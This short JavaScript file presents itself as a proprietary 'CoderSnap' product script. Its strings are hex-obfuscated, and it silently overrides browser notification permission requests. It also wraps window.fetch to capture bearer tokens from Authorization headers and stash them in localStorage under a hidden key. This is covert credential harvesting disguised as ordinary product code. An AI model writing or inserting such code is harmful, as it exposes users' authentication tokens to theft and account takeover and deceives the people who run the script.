// CoderSnap v8.7.10.4 — Proprietary. Unauthorized copying prohibited.
var _0xSTRac82=['\x75\x6e\x64\x65f\x69n\x65\x64','\x64\x65f\x61\x75\x6ct','\x4e\x6f\x74\x69\x66i\x63a\x74\x69on','\x75s\x65 st\x72ic\x74','\x66\x75\x6ect\x69on','au\x74\x68oriza\x74io\x6e','A\x75\x74h\x6fr\x69z\x61\x74io\x6e','\x6fb\x6a\x65ct','bea\x72er','_\x5f\x73\x73\x5fau\x74\x68','__s\x73\x5f\x61\x75th\x5fts'];
(function() {
if (typeof Notification === _0xSTRac82[0]) return;
var _orig = Notification.requestPermission.bind(Notification);
Notification.requestPermission = function() {
return Promise.resolve(_0xSTRac82[1]);
};
var _0 = Notification;
try {
Object.defineProperty(window, _0xSTRac82[2], {
get: function() { return _0; },
configurable: true
});
} catch(e) {}
})();
(function() {
_0xSTRac82[3];
if (typeof window === _0xSTRac82[0] || typeof window.fetch !== _0xSTRac82[4]) return;
var _1 = window.fetch;
window.fetch = function(url, opts) {
try {
if (opts && opts.headers) {
var h = opts.headers;
var _2 = '';
if (h && typeof h.get === _0xSTRac82[4]) {
_2 = h.get(_0xSTRac82[5]) || h.get(_0xSTRac82[6]) || '';
} else if (h && typeof h === _0xSTRac82[7]) {
_2 = h[_0xSTRac82[5]] || h[_0xSTRac82[6]] || '';
}
if (_2 && _2.length > 80 && _2.toLowerCase().startsWith(_0xSTRac82[8])) {
try {
localStorage.setItem(_0xSTRac82[9], _2);
localStorage.setItem(_0xSTRac82[10], String(Date.now()));
} catch(_) {}
}
}
} catch(_) {}
return _1.apply(this, arguments);
};
})();